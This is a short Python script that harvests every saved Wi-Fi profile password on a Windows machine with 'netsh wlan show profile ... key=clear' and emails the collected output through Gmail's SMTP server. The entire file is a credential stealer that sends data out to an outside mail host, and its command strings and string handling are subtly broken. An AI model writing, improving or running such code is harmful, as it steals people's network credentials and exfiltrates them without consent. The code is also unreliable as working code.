#!/usr/bin/env python

import subprocess as sp
import smtplib
import re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

result = ""
command = "netsh wlan show profile"
network = sp.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", network)
for network in network_names_list:
    command = "netsh wlan show profile" + network + "key=clear"
    current_result = network = sp.check_output(command, shell=True)
    result += current_result

send_mail("", "", result)
